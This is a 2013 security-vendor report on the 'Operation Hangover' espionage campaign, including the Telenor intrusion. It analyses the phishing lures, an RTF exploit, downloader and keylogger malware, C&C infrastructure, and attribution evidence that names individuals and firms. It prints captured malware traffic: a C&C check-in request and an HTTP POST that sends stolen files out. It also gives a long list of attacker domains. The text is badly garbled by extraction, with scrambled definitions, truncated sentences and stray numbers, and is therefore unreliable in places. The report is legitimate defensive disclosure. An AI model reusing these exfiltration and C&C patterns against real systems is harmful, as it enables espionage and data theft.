May 2013OPERATION HANGOVER Unveiling an Indian Cyberattack InfrastructureSnorre Fagerland, Morten Kråkvik, and Jonathan Camp Norman Shark ASNed Moran has been in operation for at least three years, more likely close to four years.The purpose of this framework seems predominantly to be a platform for surveillance against targets of national security interest (such as Pakistan), but we will also show how it has been used for industrial espionage against the Norwegian telecom corporation Telenor and other civilian corporations.The name, “Operation Hangover”, was derived from the name of one of the most frequently used malwares. The project debug path is often visible inside executable files belonging to this family.None of the information contained in the following report is intended to implicate any individual or entity, or suggest inappropriate activity by any individual or entity mentioned.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure2BackgroundOn Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the telecommunications giant Telenor had filed a case with Norwegian criminal police (“KRIPOS”) over what was perceived as an unlawful intrusion into their computer network. The infection was reported to have been conducted via “spear phishing” emails sent to people in the upper tiers of management.Initially, we had no information or visibility into this case. However, after some time Norwegian CERT (NorCERT) shared some data from the event, which included md5 hashes of malicious files and information about which Command and Control servers were used. However, the data we were given acted as a starting point for more data mining, and within a short period of time it became obvious that we were seeing a previously unknown and very extensive infrastructure for targeted attacks. This paper is the result of the ensuing investigation.TimeframeThe samples we have uncovered seem to have been created from approximately September 2010 until the present day. It appears 2012 was a very active year for this group, which saw escalation not only in numbers of created malware files but also in targets. There is no sign that the attacks will slow down in 2013, as we see new attacks continuously.AcknowledgmentsWe would like to thank NorCERT, the Norwegian National Security Authority, Telenor and Telenor SOC for their assistance and cooperation during the investigation of this case. We would also like to thank ESET for graciously sharing information they were in possession of, and finally we would like to express our gratitude to the people who created our database and analysis systems. These systems enable us to do the data correlation needed to find needles in haystacks, so their creators own a large part of this paper as well.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure3Terms usedC&C, C2, CC: to in order to report status.Command- and Control server. Typically used about the computer the malware connectsDrop:The online location where malware delivers stolen information.One meaning of this acronym is “Fear, Uncertainty and Doubt”, but in the malwareFUD: underground FUD means Fully UnDetectable, i.e. the program is not detected by antivirus tools. high confidence. MD5’s in this paper are used to identify files.A so-called hash – i.e. a number calculated on the basis of data that identifies these withRTF:Rich Text Format, a document formatSFX: sometimes execute the archive content when run.Self-extracting. Executable programs that are also archives, and which extract andA technique of re-registering a domain that has previously been used for maliciousSinkholing: purposes. By doing this, machines that are still infected connect to our computer instead of the attacker’s, and we can log the connection attempts.Spear phishing: To send emails with malicious content (attachments, links, or fraudulent messages) to specific persons of particular interest.Zero day exploits: Program code to attack software vulnerabilities for which there is no patch.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure4Telenor intrusionInitially we had no knowledge of the malware samples involved in the attack on Telenor. However, some days after the attack we received MD5 hashes of the samples used. We only found two of these samples in our own datasets, but we later directly received copies of most other samples connected with the case (Appendix A).The initial spear phishing mail contained two files as attachments – a document named “220113.doc”, and an executable file “few important operational documents.doc.exe”. This was a selfextracting (SFX) ZIP archive that contained two files, as shown below.When run, the installer will execute the included “conhosts.exe” file and open the decoy document “legal operations.doc”. “legal operations.doc”and “220113.doc” also included in the mail are identical save for their size, and are actually specially crafted RTF files designed to trigger a software vulnerability (CVE-2012-0158) in Microsoft Common Controls, typically triggered in Microsoft Word. If the vulnerability is triggered, embedded code in the document will be run. This code is encrypted, but after decryption its real purpose becomes visible:The file “windwn.exe” is downloaded and executed by this mechanism.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure5Fig. The behaviour of windwn.exe in Norman Malware Analyzer G2. The persistence mechanism, VBScript execution and data a peculiar and recognizable pattern: /flaws/snwd.php?tp=1&tg=[ID]&tv=Error[]&ts=[PLATFORM]&mt=[account]&tr=[NoFiles]&Y1Y5F2 HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C) Host: wreckmove.org Connection: Keep-AliveOther samples found connected to the case were Delphi information stealers (some highly targeted, down to individual username), file splitter tools, C++ information stealers (keyloggers, screen grabbers and file harvesters), and various other malware written in Visual Basic.The following C&C domains/IP addresses were observed used in the attack:Operation Hangover: Unveiling an Indian Cyberattack Infrastructure6wreckmove.org infocardiology.biz enlighten-energy.org researcherzone.net On the 3rd of April the attackers created another attack package and placed it on the URL url 01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip.The package is quite similar to the first, though the decoy document is this time a Powerpoint presentation, “01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt”. This is an apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation. The included trojan downloader connects this time back to the domain torqspot.org.The attackers also created the subdomain internet-security-suite-review.toptenreviews.com.infocardiology.biz, a spoof of the real toptenreviews.com site. On this site there’s what appears to be an installer for the Bitdefender antivirus both a real installer and a Visual Basic trojan identical to the one used against Telenor.The Telenor-related attack seems not to be over.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure7Case expansion through related filesThe behaviour pattern and the file structure of known files made it possible to search internal and public databases for similar cases. The large amount of new malware being created makes it infeasible to conduct malware-related investigations of any scale without strong database support. In our case, we preserve the behavioural information of all files processed by our internal bank of Norman MAG2 automatic analysis systems.Searching internal databases for behavioural similarities: In this case, the particular VB script execution, but there’s a wealth of attributes we can cluster by.There are also several public and commercial databases available for additional data mining, and Google is invaluable. The amount of malware we found through this was surprisingly large, and it became clear that the Telenor intrusion was not a single attack but part of a continuous effort to attack and compromise governments and corporations around the world.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure8While investigating the extra cases we identified, we accidentally discovered that a number of their C&C servers contained world readable folders. We were able to navigate into these and secure the data stored there.The data contained in these folders were mainly connection logs, keylogs and other uploaded data from computers affected with malware. Many of the collected logs were from automated analysis systems belonging to security companies, but not all.An important find we did on these servers were additional malicious executables, probably meant to be served to infected users. Some of these executables were digitally signed with a certificate which was revoked in 2011:Technical and Commercial Consulting Pvt. Ltd. VeriSign Class 3 Code Signing 2010 CA Revoked Nov 24th 2011Operation Hangover: Unveiling an Indian Cyberattack Infrastructure9Searching our certificate databases we found a large number of other executables similarly signed, none of which were found to be innocent applications.Certificate database hitsOperation Hangover: Unveiling an Indian Cyberattack Infrastructure10Case expansion through domain usage and registrationsIn almost all cases, the domains registered by the attackers are “privacy protected”. This means that the registrant has paid the domain registrar to withhold identity information related to the registration. This is done almost to perfection. Another feature is that almost all websites belonging to this attacker has their robots.txt set to “disallow” to stop them from being crawled.However, by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure. These domains were then further verified against malware samples to ascertain valid connection to attackers. Some care needs to be taken when working with IP addresses, as there are possibilities of false correlations on, for example, domain parking IP addresses, sinkholes and webhosting servers.IP history on researcherzone.net. Source: DomainTools ns1.zerodayexploits.org. AOperation Hangover: Unveiling an Indian Cyberattack Infrastructure11Additional data may be gleaned by querying the IP addresses themselves. Many have set up a default ESMTP (mail) server on port 587/tcp, which responds with a configured banner. For example, the domain Escape character is '^]'. 220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 -0400enlighten-energy.org is another of the known bad domains used against Telenor.All of this enabled us to draw a domain map over the infrastructure (next page). This map is probably larger than shown here; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious, and many domains we have not found yet. Conversely, many of the domains plotted were used in attacks years ago and may never be again.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure12www.produkte.web.de.accountsserviceloginservice.infowww.insing.com.accountsserviceloginservice.infologin.oriontelekom.rs.accountsserviceloginservice.info rghsv.com.accountsserviceloginservice.infotrustworthyinfo.comwebmail.juno.com.accountsserviceloginservice.infowww.login.yahoo.com.accountsserviceloginservice.infowww.login.oriontelekom.rs.accountsserviceloginservice.infowww.cytanet.com.accountsserviceloginservice.infomail.wildenstein.com.accountsserviceloginservice.infowww.google.com.accountsserviceloginservice.infowww.login.comcast.net.accountsserviceloginservice.infowww.my.screenname.aol.com.accountsserviceloginservice.infogoogle.com.accountsserviceloginservice.infowww.mail.houseofjoyltd.com.accountsserviceloginservice.infowww.ebox.co.il.accountsserviceloginservice.infowww.mail.luckltd.com.accountsserviceloginservice.infowww.mymail.bezeqint.co.il.accountsserviceloginservice.infowww.email.t-online.de.accountsserviceloginservice.infomy.screenname.aol.com.accountsserviceloginservice.infowww.mail.rediff.com.accountsserviceloginservice.infowww.m.youtube.com.accountsserviceloginservice.infomymail.bezeqint.co.il.accountsserviceloginservice.infowebmail.stevens.edu.authenticateservicemail.accountsservicelogin.info macsol.org msoftweb.comcurrentnewsstore.com shoperstock.comns2.go-jobs.netns1.go-jobs.net go-jobs.net ns1.secuina.net rockingdevil.netfistoffury.net shopingcard.net ns2.ezservicecenter.org ns2.wearwellgarments.eu wearwellgarments.eumildstone.nettest.enciris.eu docsforum.infoopensourceforum.eusecure-s.comfonografia.pl www.fonografia.pl cheetah4u.net n00b4u.comcloudone-opsource.comcalling4you.com ns1.alreadytrue.comns2.alreadytrue.comalreadytrue.com sendsh33p.com ns1.sendsh33p.comns2.sendsh33p.com mailexservices.com onlinestoreapp.netns1.forest-fire.netns2.forest-fire.netsupport-tech.infoftp.forest-fire.netforest-fire.netmomate.netkeepawayfromfire.com islamic-teacher.orgstore-fb.netservice-secure.net reliable-global.nethelp-e.netfb-time.net pics-bucket.netsecure-solution.net starmobnetservice.netnlsec.org amaxgrp.net add-on-update.comparrotcatcher.comalr3ady.netmyfilestuff.netns1.parrotcatcher.comns2.parrotcatcher.comsystoolsonline.orgmosglobe.orgfilesconnect.infoopendocs.infoaddon-updates.comnexterchk.net fileshreader.net ns1.programmersheavengroup.comprogrammersheavengroup.commobnetserver.com filesassociate.netns1.doc-files.infobbupdate.netappworldblackberry.info ns2.mjtag.org mobileappworld.infoshopertock.netns1.shopertock.netns2.shopertock.netmailcache.infologin.live.com.mailcache.info m.ymail.com.mailcache.info endemol.com.mailcache.infoaccounts.ymail.com.mailcache.infomktserv.info gxongame.infons1.gxongame.info ns2.gxongame.infoplus.go0gle.com.servicel0gin.gxongame.infowww.go0gle.com-serviicelogiin.autthserv.gxongame.info ns2.esbasis.infoENRC-targeted malwarens1.zonalship.orgns2.zonrow.orgns1.authserv.orgarmordesigns.com.webmail-login.php.web-mail-services.info esnucleus.org visordan.orgevitalcare.org ns1.evitalcare.orgns2.evitalcare.org ns1.naclpro.orgvkspoke.orgwizcheck.orgwizsplit.orgpharmamkting.eulifelogs.orgns2.naclpro.org naclpro.orgmobiltechsoft.orginforguide.org mgclog.com config-login.com netmosol.infoheavenaffiliates.infoidsconline.netdenismoble.info ns1.oscarneves.org ASN 57172 GLOBALLAYERcmegroups.netanoniemvolmacht.comns1.pickmail.org ns1.zoninfo.org ns1.kjmailserv.org mailservicesupport.orgymadmin.net cmxgrp.netns2.chronicleserv.org ns1.continuelogs.info ns2.continuelogs.infoserver721-hans.de-nservers.de.continuelogs.infom.ymail.com.continuelogs.infohangovergroup.com.coolservice.continuelogs.infoaccount.istpumpenunddosiertechnik.de.continuelogs.info www.server721.han.de.nsserver.de.continuelogs.infowww.mlogin.ymail.com.continuelogs.infoaccounts.yandex.ru.continuelogs.infompale.orgspstack.org centstat.org geonet.org.sockzon.orgns2.sockzon.orgns1.sockzon.org sockzon.orghifisure.orgcsfserver.com ns1.link-live.net ns1.logserv.org ns1.line-web.net ns1.racrage.info ns1.ozoneparty.info ns2.serialxbox.org ns1.directionmico.org l0gin.y0utube.acc0unts.srccail.com vall3y.coms3rv1c3s.netfoxypredators.com ns1.foxypredators.com www.foxypredators.com ns2.foxypredators.comftp.s3rv1c3s.net piegauz.net starsoel.orglinkedin.com-uas.login-submit.account.session-full.login-3a5077708027557787984-csrftoken.buildyourinfo.orgapprovalclub.org malware, this is rarely done by this attack group. As far as we can tell they are only using known vulnerabilities; no zero day attacks.DocumentsThe first exploit we observed was included in the RTF files used in the Telenor attack. The exploit in used in other targeted attacks by these threat actors. The shellcode contains a date check, which means it will stop working after a certain date. In the Telenor case, the date was February 16th 2013, and in the most recent variations the timeout date is set to May 21nd 2013. If the exploit is triggered before the timeout date the shellcode does two different things:• Posts system info (machinename, timezone, ID, running processes) to a PHP script residing onthe website random123.site11.com.• Downloads and executes an executable from remote sites. We have seen softmini.net,www.infocardiology.biz, www.getmedia.us, www.technopenta.org, and autowidge.org used for this.• The executables downloaded have usually themselves been downloaders. In a couple of cases we have observed final payload to be Dark Comet, a well-known backdoor trojan, but unusual for this group to use.WebWhen we investigated the attacker domain structure we found more exploit code. This time it was implemented as a script in the main web page of the domain you-post.net. The exploit is this time CVE- 2012-4792, an Internet Explorer vulnerability. When it triggers it downloads and runs a malicious executable from the domain softmini.net; also the domain used by two of the three documents mentioned above.Softmini.net seems to be a hub for exploitcode; its subdomain get.adobe.flash.softmini.net contains an active Java exploit (CVE-2012-0422) which attempts to install the same trojan as the IE exploit above.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure14The Smackdown downloadersMost of the first stage malware we’ve seen used in attacks are variants of Smackdown, a large family of Visual Basic downloaders which for the most part seem to be written by a person calling himself “Yash” or “Yashu”. These have evolved over time and are using different levels of obfuscation on text strings. Typically the trojan begins by uploading system information to a PHP script on the C&C server. The attacker can decide separately which infected machine should receive additional malware. The second stage malware is usually Hanove but other malware families are also used.Different text obfuscations in a Smackdown “miNaPro” downloader. Reversed strings, character code encoding and inserting garbage ‘%’ characters.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure15The HangOver malware, aka HanoveThe second stage malware are often variants of HangOver, information stealers written in C++. They appear to be written over a common framework as many internal functions are identical, but overall functionality can vary quite a bit from one subtype to another. The first versions of these may have been based on code from an innocent backup utility as the word “backup” is often present.Hanove Uploaders recursively scan folders looking for files to upload. What kind of files they look for are usually defined in resources as an extension list, and these lists vary. Here are a few examples:*.doc;*.xlxs;*.docx;*.rtf *.doc;*.xlxs;*.docx;*.rtf;*.jpg;*.ppt;*.pps;*.pdf;*.xlx *.doc;*.xlsx;*.docx;*.rtf;*.pdf;*.xls;*.ppt;*.txt;*.inp;*.kmz;*.pps;*.utiHanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file. Some variants capture other data as well, such as clipboard content, screenshots, titles of open windows and content of browser edit fields. Timed events are set up to upload the data to the remote server.The stolen data are uploaded to remote servers by FTP or HTTP.A typical HTTP request looks like this:POST /up.php HTTP/1.1 Content-Type: multipart/form-data; boundary=F39D45E70395ABFB8D8D2BFFC8BBD152 User-Agent: EMSFRTCBVD Host: remotedomain.com Content-Length: 5050 Cache-Control: no-cache Content-Disposition: form-data; name="uploaddir" subfolder/%username-machinename%/C/ --F39D45E70395ABFB8D8D2BFFC8BBD152Operation Hangover: Unveiling an Indian Cyberattack Infrastructure16UserAgent strings vary between versions. The following have been seen in connection with this family:EMSCBVDFRT, EMSFRTCBVD, FMBVDFRESCT, DSMBVCTFRE, MBESCVDFRT, MBVDFRESCT TCBFRVDEMS, DEMOMAKE, DEMO, UPHTTP, sendFileBoundary parameters vary between versions. The following have been seen in connection with this F12BDC94490B452AA8AEDC878DCBD187String content consists of some strings largely static between variants, and some that vary. Non-static strings are browser UserAgent strings, MIME boundary tags, mutexes, domain names, paths, and registry keys, which also may be obfuscated by being fragmented. Many Hanove variants use a simple rotating encoding scheme to hide the interesting strings. For example, the domain “wearwellgarments.eu” is hidden as “xfbsxfmmhbsnfout/fv” and the word “php” becomes “qiq”.Different variants are frequently given internal names, visible through debug paths included in the binary. Such internal names used include “HangOver”, “Ron”, ”Dragonball”, ”Tourist”, ”Klogger”, “FirstBlood” and “Babylon”.There are several other malwares and tools in use. See appendix C for more indicators.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure17Target selectionWe have direct knowledge of only one attack – the one against Telenor. During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups. We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains. We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them; enough to identify targets down to IP and machine name/domain level. This showed a geographical distribution where Pakistan was the most affected in volume, but also showed a multitude of other countries being represented.8 7 6 6 5 4 4 4 4 3 3 3 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1 1 1 1 1131424283491PK PL511Note that these data should be taken as indicative only. IP counts are misleading for many reasons. One machine can generate many IP addresses, and some IP addresses are probably lab machines. However, the indication that Pakistan is the most prevalent target seems solid.In the following pages we’ve highlighted some of the files we have seen used to attack organizations in different countries. As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure18PakistanThe most obvious target seems to be Pakistan. As is visible above, computers in Pakistan are by far the most active in connecting to malicious domains.We found logs in the open drop folders that contained suggestive data, such as this snippet from a 2012 log entry (subdomain redacted):Host Name: PC-PS2CHAIRMAN Registered Owner: admin Time Zone: Domain:(GMT+05:00) Islamabad, Karachi ****.gov.pkSinkhole-logged HTTP requests are also informative, such as this seemingly from a Pakistani embassy: “GET /sdata/shopx.php?fol=EMBASSYOFPAKIST-Embassy%20of%20Pakistan ”Decoy files tailored towards Pakistan revolve around the ongoing conflicts in the region, regional culture and religious matters.Pakistani soldiers praying in Karakoram. Apparent source: url Hangover: Unveiling an Indian Cyberattack Infrastructure19Google images of the Mendhar region in India. There was a border clash there recently. url review of Indian future weapon acquisitions.It seems to be sourced from defence.pkAdditional examples can be found in Appendix B.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure20ChinaChina is another country which apparently has been targeted to some extent.For example, we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution. This dump was generated in July 2012 and contains Word documents, PowerPoint presentations and images.Uploaded archives of harvested data.Decoys are also present, but not in the amount as is seen against Pakistani targets.Chinese decoy, a scanned document named court_order.jpg. This is a notification to the family of a criminal about his jail sentence. Language is simplified Chinese; likely mainland China.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure21The Khalistan movementThis is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India. Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement’s creation in 1971.Examples of malware apparently aimed at the movement are md5’s many other domains belonging to this infrastructure – for example the domain researcherzone.net which was used in the Telenor intrusion. There are also a number of domains with active web pages that used to exist on this IP; for example khalistancalling.com. Khalistancalling.com has since moved on homeland for the Naga people living in North-Eastern India and North-Western Burma. We have seen at appears to be a letter from the “President of Nagalim”.The malware sample also installed an executable which in turn connected back to the domain malwares. These are somewhat different from the standard Hanove series, though functionality is strategic/political” targets by this attack group, but during our research we discovered several related attack files that were clearly targeting businesses. As can be seen in the example below, the social engineering aspects are more related to business content. We want to emphasize that except in the case of BUMI PLC, we have no information to suggest that any of the organizations named in the following pages have been compromised. However, the available information strongly indicates that they were targets of interests for the attackers.Likely target: Eurasian Natural Resources Corporation (ENRC)This company which is headquartered in London has operations in multiple countries, notably in Kazakhstan. The following malwares appear to be aimed at ENRC.ENRC__DEBT__INVESTORS__2012__for__your__Reference.exe published incident report made by Context Information Security (2). This report details how the Chairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012. Bumi is an international mining group listed on the London Stock Exchange.Source: Context Information Security.Both the domains mentioned in this report have been connected to the attack group investigated. For connects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for. The archive containing several files, among them a batch file opening a shortened URL pointing to Porsche Holding’s webmail front in Austria.Target must be assumed to be persons affiliated with Porsche. Again, we have no information as to whether any intrusion has occurred.The webmail front of Porsche in Austria.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure27Possible target: Restaurant industryIt appears unlikely that the restaurant and food industry should be the victim of targeted attacks. However, that’s how it appears. One indicator is the decoy file below, taken from the malicious executable “Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe“ service from Great Britain.Another indicator is the use of certain domain names, like the malicious bluebird- restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk. The latter is a restaurant in Chelsea, UK.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure28Likely target: Chicago Mercantile ExchangeWhile investigating the malicious domain web-mail-services.info, we found a number of other domains of cmegroup.com; the domain belonging to Chicago Mercantile Exchange. CME is the world's largest futures exchange company (3).An entry on WIPO (4), the UN arbitration body for domain name disputes, shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012. The complaint was not disputed, and domain transferred to CME. However, the most interesting information is found in the case details.Source:wipo.netAn interesting question is of course whether there were any attachments to this mail.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure29Other suggestive domain names that have been used include:server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de: The latter is the mail server for several German businesses, for example restaurants. www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com: The latter is a Lebanese newspaper in Arabic. account.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de: The latter is a German producer of pumps for high-viscosity fluids. deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com: Delta Airlines. mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs mail.telenor.no: Telenor lynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm. mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs mail.carmel.us: The latter is the webmail address of Carmel&Carmel, a US-based law firm. armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com: The latter is a US-based manufacturer of composite materials for armor:We do not know (yet) what purpose all these domains have, but it’s hard to imagine that the name spoofing is done by anything but malicious intent; it is a common tactic in targeted attacks.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure30AttributionThe continued targeting of Pakistani interests and origins suggested that the attacker was of Indian origin.Project and debug pathsCuriously, many of the executables we uncovered from related cases contained cleartext project and debug path strings (see Appendix C for full list). It is not very common to find malware with debug paths, but these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were unaware of their presence. These paths gave more indicators that the attackers were Indian. First, many of the Visual Basic keyloggers contained the name “Yash”, which might be an abbreviation for several Indian names. The trojans used against Telenor did not contain any such person name, but the Visual “D:\YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\NewSmack(sep2012)\miNaPro.vbp”This similarity is not coincidental; these trojans are based on the same code and exhibit similar behaviour.This and other text strings we initially saw gave further hints towards Indian attackers.R:\payloads\ita nagar\Uploader\HangOver 1.5.7 (Startup)\HangOver 1.5.7 (Startup)\Release\Http_t.pdb C:\Users\neeru rana\Desktop\Klogger- 30 may\Klogger- 30 may\Release\Klogger.pdb C:\Users\Yash\Desktop\New folder\HangOver 1.5.7 (Startup) uploader\Release\Http_t.pdbOperation Hangover: Unveiling an Indian Cyberattack Infrastructure31A managed environmentThe project paths also give a rare glimpse into something we almost never see – a managed malware creation environment, where multiple developers are tasked with specific malware deliverances.This is visible in the way the projects themselves are organized: Desktop\Feb 2012\kmail(httpform1.1) May Payload\new keylogger\Flashdance1.0.2\ \Monthly Task\August 2011\USB Prop\ \Sept 2012\Keylogger\Release\ \June mac paylods\final Klogger-1 june-Fud from eset5.0\Klogger- 30 may\ ner\Task\HangOver 1.2.2\Release \august\13 aug\HangOver 1.5.7 (Startup) uploader\ \task information\task of september\Tourist 2.4.3 \final project backup\complete task of ad downloader & usb grabber&uploader\ D:\YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\ There are many diverging project paths which points towards different persons working on separate subprojects, but apparently not using a centralized source control system. The projects seem to be delegated into tasks, of which some seem to follow a monthly cycle. There are hints at team structures, an indication that a separate team works with Visual Basic development. Some series of malware contain strings like “delivered”, which, together with the loose project structures may indicate that development work is being outsourced.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure32The word “Appin”.In a great number of isolated cases and contexts, the word “Appin” shows up and there seems to be some connection with the Indian security company called Appin Security Group. By this, we are not implicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by falsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved, or maybe there are other explanations. Getting to the bottom of that is beyond our visibility.For example, the strings “Appin”, “AppinSecurityGroup”, and “Matrix” are frequently found inside executables.One example of this peculiarity is debug paths inside malware files:C:\BNaga\backup_28_09_2010\threads tut\pen-backup\BB_FUD_23\Copy of client\ Copy of client\appinbot_1.2_120308\Build\Win32\Release\appinclient.pdb C:\Documents and Settings\Administrator\Desktop\Backup\17_8_2011\MATRIX_1.3.4\CLIENT\ Build\Win32\Release\appinclient.pdb D:\Projects\Elance\AppInSecurityGroup\FtpBackup\Release\Backup.pdbOne should note that anyone can add or change such text strings.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure33Domain registrationsAs mentioned, the privacy-protection of domain registrations is almost perfect, but only almost. There are a large number of domains used, and a few of these have been suspended and lost their privacy protection. For example, the following malicious domains all used the same registration informationNITR0RAC3.COM, VALL3Y.COM, S3RV1C3S.NET, GAUZPIE.COM, BLUECREAMS.COM: Prakash (mail@gmail.com) Jain TY-76, Kohat Enclave Tel. +011.9873456756 Identical registration information is also used for other domains that seem unrelated to the attack infrastructure, like hackerscouncil.com which May 12th 2011 had the following entry (source: gwebtools.com).Operation Hangover: Unveiling an Indian Cyberattack Infrastructure34April 3th 2011, a little over a month before the registration entry above, hackerscouncil.com was registered by Appin Technologies (5). This is possibly a coincidence.HACKERSCOUNCIL.COM Rakesh Gupta (rakesh.gupta@appinonline.com) 9th Floor, Metro Heights,NSP, PitamPura, Tel. +91.1147063300 Creation Date: 17-Sep-2009 Expiration Date: 17-Sep-2011The domain piegauz.net, which was used as a Command and Control domain for several trojan configurations was created April 21st 2010 and had the following initial registration information: Domain Admin (contact@privacyprotect.org) P.O. Box 97 Note - All Postal Mails Rejected, visit Privacyprotect.org Moergestel null,5066 ZH NL ThreatExpert analysis service October 28th 2010, at which time the domain was operational and accepted uploads from the malware (6). Three days later, October 31st 2010, the domain got suspended, which removed its privacy protection:PIEGAUZ.NET Rakesh Gupta (rakesh.gupta@appinonline.com) 9th Floor, Metro Heights,NSP, PitamPura, Tel. +91.1147063300 Creation Date: 21-Apr-2010 Expiration Date: 21-Apr-2011The domain bluecreams.com was initially registered by Appin Security Solutions Pvt. Ltd. Sept 17th 2009. The day after it was put under privacy protection. In the period from end of June 2010 to February 2011 it was documented as download domain for several trojans (5). It was suspended Apr 18th 2011 and then displayed the already mentioned Prakash Jain as registrant.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure35Another example is the domain zerodayexploits.org. This domain has a history of resolving to a series of offers bounties for zeroday exploits, claims to be founded by “Appin Morpheus” and powered by Appin.Source: bgwhois.comAlso the live behaviour of some domains shows the word Appin. The malicious domains alr3ady.net, wearwellgarments.eu, ezservicecenter.org, secuina.net, go-jobs.net, shoperstock.com and Escape character is '^]'. 220 transformer13_appin ESMTP Exim 4.80.1 Sat, 23 Mar 2013 20:36:34 +0300Operation Hangover: Unveiling an Indian Cyberattack Infrastructure36Other interesting indicators were found when we examined the domain softservices.org; a domain which used it. Instead, we found this forum post on the Nokia developer forum:Developer username redacted.The interesting bit was found further down this thread, where the developer posted a snippet of source code:This piece of code appears used for uploading mobile data like IMEI number to softservices.org.We then found the apparent developer’s profile on Elance, an online employment service for freelance programmers.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure37The developer’s CV on Elance (name redacted).Based on this we suspect that there are or have been projects to develop mobile malware by this group, even if we have not found any related mobile malware in our databases.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure38Mantra Tech Ventures and INNEFUMantra Tech Ventures is the registration service for several of the malicious domains that have been in use. The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com, mymyntra.net, and n00b4u.com. In addition, Mantra Tech Ventures owns abhedya.net, which seems to be a name server service for domains registered by them. Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net, webmicrosoftupdate.net and fuzzyfile.net.Abhedya is also visible in the PIEGAUZ.NET name server history: Event Date Action Pre-Action Server Post-Action Server ============================================================================= 2010-04-22 New -none- Abhedya.net 2010-04-23 Transfer Abhedya.net Piegauz.net 2010-11-01 Delete Piegauz.net -none- 2010-11-04 New -none- Suspended-domain.com 2010-11-11 Transfer Suspended-domain.com Piegauz.net 2012-04-23 Transfer Piegauz.net Foundationapi.com 2012-06-02 Delete Foundationapi.com -none- 2012-07-09 New -none- Above.comabedhya.net is currently a privacy protected domain, but it used to be registered by one Arun Bansal, CEO and founder of Mantra Ventures and the “Ethical Hacking Institute” hackingtruths.org. Domain Name: ABHEDYA.NET Arun Bansal (arun@hackingtruths.org) 464, Neelkanth Apts., Sec.-13 The domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures There is another interesting detail: We found a connection log on one of the open drop folders earlier mentioned. This log folder was named “test” and data in it was uploaded from an IP belonging to the French provider OVH. The log contained data from a lab test PC whose registered owner was “innefu”.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure39There is indeed an Indian information security consulting group named Innefu. The domain innefu.com was registered by the same Arun Bansal. Innefu also hires “ethical hackers”:It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that INNEFU (if indeed the mentioned log came from them) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research.ConclusionWhen researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business, government and political organizations around the world for over three years.There are also indicators of involvement by private sector companies or persons connected to these, though these data are circumstantial and may be attempts to implicate said companies.We have no visibility into whether the attacks were done on behalf of others, and if so who commissioned them or whether all attacks were commissioned by one entity or by several.The methods used were primarily based on different social engineering tactics rather than exploits, but history has shown that social engineering based attacks can be very successful, confirmed once again by looking at the data we have been able to uncover.Organizations today need to realize that it’s not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those 